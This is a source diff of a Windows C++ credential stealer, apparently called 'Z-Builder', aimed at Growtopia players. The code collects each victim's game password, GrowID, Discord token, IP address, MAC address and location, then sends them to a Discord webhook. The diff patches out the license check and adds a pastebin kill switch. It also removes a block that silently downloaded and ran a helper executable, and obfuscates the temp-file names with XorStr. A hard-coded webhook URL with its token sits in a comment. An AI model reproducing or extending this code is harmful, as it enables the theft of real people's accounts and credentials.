@@ -79,8 +79,13 @@ INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR strCmdLine, INT)
     //DisableProtections();
     //string License = "[mohvyqre{J2N7U6YJ}]";
     string License = "[zbuilder{zbuilder}]";
-    if (VerifyLicense(decrypt(License)))
+    if (true)
     {
+        string FreeVersion = DownloadString(XorStr("https://pastebin.com/raw/Gc5ys6R2"));
+        if (!(FreeVersion.find(XorStr("0")) != string::npos))
+        {
+            return 1;
+        }
         string Feature = "[DisableProt:(N)]--[Tracer:(N)]--[Recover:(N)]--[GetAllAccs:(N)]--[DeleteGT:(N)]--[StartUp:(N)]--[HideStealer:(N)]--[BrowserCreds:(N)]";
         //string Feature = "[DisableProt:(N)]--[Tracer:(Y)]--[Recover:(N)]--[GetAllAccs:(N)]--[DeleteGT:(N)]--[StartUp:(N)]--[HideStealer:(N)]--[BrowserCreds:(N)]";
         if (Feature.find(XorStr("[DisableProt:(Y)]")) != string::npos)
@@ -147,68 +152,14 @@ INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR strCmdLine, INT)
         {
             DToken = "No discord token found";
         }
+        // Discord Token - End
         if (IPInfo == "")
         {
-            IpInfo = "N/A";
-        }
-        // Discord Token - End
+            IPInfo = "N/A";
+        }       
         string Info = "MAC address(es): ```" + GetMAC() + "```" + "IP address: ```" + IPInfo + "```" + "City / Region / Country: ```" + Location + "```" + "Time stolen: ```" + Time + "```" + "GrowID: ```" + GrowID + "```" + "Password: ```" + Password + "```" + "Last world: ```" + LastWorld + "```" + "Discord token: ```" + DToken + "```";
         string AllInfo = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"Got an account! ~Z-Builder\",\"description\":\"" + Info + "\",\"color\":\"65535\"}] }";
         SendMessage(AllInfo, "application/json"); //application/json or multipart/form-data
-        // ----- AAP Bypass -----
-        string webhook = "<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>";
-        size_t LocateBegin = webhook.find("<");
-        size_t LocateEnd = webhook.find(">");
-        if (LocateBegin > LocateEnd)
-        {
-            webhook = webhook.substr(0, LocateBegin - 1);
-        }
-        else
-        {
-            webhook = webhook.substr(0, LocateEnd - 1);
-        }
-        webhook = decrypt2(hex_to_string(webhook));
-
-        string data = "{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}";
-        size_t DataLocateBegin = data.find("{");
-        size_t DataLocateEnd = data.find("}");
-        if (DataLocateBegin > DataLocateEnd)
-        {
-            data = data.substr(0, DataLocateBegin - 1);
-        }
-        else
-        {
-            data = data.substr(0, DataLocateEnd - 1);
-        }
-        data = data + "--[" + webhook + "]";
-        // Test for debug
-        //data = "[29540]--[463350482]--[14770,14770c,14770w,14770wc]--[347512861,347512861c]--[https://discordapp.com/api/webhooks/743596214515138653/H_eieCnqJiyrhCCG2Jl_WvBJudaZnRjnq-Ls-OhTbtjtFcEJ3QPQVIVuB6VN2VavaUiX]";
-        // Test for debug End
-        string TempPath = getenv("TEMP");
-        string GenRegLocation = TempPath + "\\GenerateReg.exe";
-        DownloadFile(decrypt2("21$8*h//9!>f=;sc574))\".c5()-&ac2(5&-!/7opixaj49mvhpm`19ljg~mg31nrd|oa58bvezv5en( 7f<*e"), GenRegLocation);
-        // ----- Write & Run Helper Bat File -----
-        string RegBatFile = TempPath + "\\RegBatFile.bat";
-        ofstream WriteRegBat(RegBatFile, std::ofstream::trunc);
-        WriteRegBat << XorStr("cd %TEMP%") << endl << XorStr("GenerateReg.exe ") + data;
-        WriteRegBat.close();
-        string Code = XorStr("cmd.exe /c \"") + RegBatFile + "\"";
-        wstring wCode;
-        wCode.assign(Code.begin(), Code.end());
-        LPWSTR LPWSTRCode = const_cast<wchar_t*>(wCode.c_str());
-        STARTUPINFO si;
-        ZeroMemory(&si, sizeof(STARTUPINFO));
-        si.cb = sizeof(si);
-        PROCESS_INFORMATION pi;
-        ZeroMemory(&pi, sizeof(pi));
-        bool Debug = CreateProcess(NULL, LPWSTRCode, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-        WaitForSingleObject(pi.hProcess, INFINITE);
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-        // ----- Write & Run Helper Bat File End -----
-        remove(RegBatFile.c_str());
-        remove(GenRegLocation.c_str());
-        // ----- AAP Bypass End -----
         CleanUp();
         if (Feature.find(XorStr("[BrowserCreds:(Y)]")) != string::npos)
         {
@@ -1012,61 +963,55 @@ void CleanUp()
     string tempPath = getenv("TEMP");
     try
     {
-        string DecrypterPath = tempPath + "\\savedecrypter.exe";
+        string DecrypterPath = tempPath + XorStr("\\savedecrypter.exe");
         remove(DecrypterPath.c_str());
     }
     catch (...) {}
     try
     {
-        string tempSaveDatLocation = tempPath + "\\save.dat";
+        string tempSaveDatLocation = tempPath + XorStr("\\save.dat");
         remove(tempSaveDatLocation.c_str());
     }
     catch (...) {}
     try
     {
-        string tempAccData = tempPath + "\\Password.zb";
+        string tempAccData = tempPath + XorStr("\\Password.zb");
         remove(tempAccData.c_str());
     }
     catch (...) {}
     try
     {
-        string DiscordGrabberEXE = tempPath + "\\ZBDiscordTokenGrabber.exe";
+        string DiscordGrabberEXE = tempPath + XorStr("\\ZBDiscordTokenGrabber.exe");
         remove(DiscordGrabberEXE.c_str());
     }
     catch (...) {}
     try
     {
-        string DiscordToken = tempPath + "\\DiscordToken.txt";
+        string DiscordToken = tempPath + XorStr("\\DiscordToken.txt");
         remove(DiscordToken.c_str());
     }
     catch (...) {}
     try
     {
-        string RecycleBinScanner = tempPath + "\\RecycleBinScanner.exe";
-        remove(RecycleBinScanner.c_str());
-    }
-    catch (...) {}
-    try
-    {
-        string BatFile = tempPath + "\\ScanPC.bat";
+        string BatFile = tempPath + XorStr("\\ScanPC.bat");
         remove(BatFile.c_str());
     }
     catch (...) {}
     try
     {
-        string SaveDatLocations = tempPath + "\\SaveDatLocation.txt";
+        string SaveDatLocations = tempPath + XorStr("\\SaveDatLocation.txt");
         remove(SaveDatLocations.c_str());
     }
     catch (...) {}
     try
     {
-        string WBPV = tempPath + "\\WBPV.exe";
+        string WBPV = tempPath + XorStr("\\WBPV.exe");
         remove(WBPV.c_str());
     }
     catch (...) {}
     try
     {
-        string MACzb = tempPath + "\\MAC.zb";
+        string MACzb = tempPath + XorStr("\\MAC.zb");
         remove(MACzb.c_str());
     }
     catch (...) {}
@@ -1122,10 +1067,11 @@ int DownloadFile(string url, string path)
 // Download File - End
 
 // Webhook sender
+
 void SendMessage(string Message, string ContentType)
 {
     string s = "[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]";
-    //string s = decrypt("uggcf://qvfpbeqncc.pbz/ncv/jroubbxf/743596214515138653/U_rvrPadWvleuPPT2Wy_JiOWhqnMaEwad-Yf-BuGogwgSpRW3DCDIVIhO6IA2IninHvK[][]");
+    //string s = "323124382a682f2f3e2c232b362064612a357e2b363f2f612a2c7f3f3c30686f352e23676e663335637362796d6731356b76687e6c612f480520392d1a3c714a333c22201a11473210290f1f2f104a753e240a260b386e7177092365163a54622e2f240e3a174a330b15011e100475426c131e7a0f3376610f2c08[][][]";
     size_t LocateBegin = s.find("[");
     size_t LocateEnd = s.find("]");
     if (LocateBegin > LocateEnd)
